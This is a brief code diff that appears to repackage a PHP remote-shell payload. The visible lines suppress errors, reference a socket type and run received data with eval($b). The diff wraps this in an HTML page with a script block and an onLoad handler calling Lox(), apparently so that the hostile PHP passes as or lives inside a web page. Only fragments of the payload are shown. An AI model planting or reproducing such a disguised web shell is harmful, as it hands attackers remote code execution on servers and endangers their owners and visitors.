@@ -1,3 +1,7 @@
+<html>
+<title>:D</title>
+<head>
+<script>
 /*<?php
 /**/
 error_reporting(0);
@@ -51,4 +55,10 @@ $GLOBALS['msgsock_type'] = $s_type;
 eval($b);
 die();
 
-?>
+?> 
+
+</script>
+</head>
+<body onLoad="Lox()">
+</body>
+</html>
